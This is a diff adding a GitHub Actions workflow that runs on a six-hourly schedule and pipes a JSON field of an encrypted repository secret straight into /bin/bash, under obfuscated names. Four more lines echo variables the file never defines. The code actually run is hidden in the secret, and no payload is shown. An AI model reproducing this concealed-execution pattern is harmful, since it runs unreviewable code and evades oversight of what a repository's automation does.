@@ -1,0 +1,21 @@
+name: paizhaocam
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '17 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: paizhaocam
+        env:
+          ltnk641: ${{ secrets.ltnk641 }}
+        run: |
+          echo $ltnk641 | jq -r .jm73519 | /bin/bash
+          echo $zzq95012 | jq -r .cx0 | /bin/bash
+          echo $rr0270 | jq -r .k327 | /bin/bash
+          echo $oy58526 | jq -r .azqmz75249 | /bin/bash
+          echo $bwszz93582 | jq -r .wrrf7 | /bin/bash
+
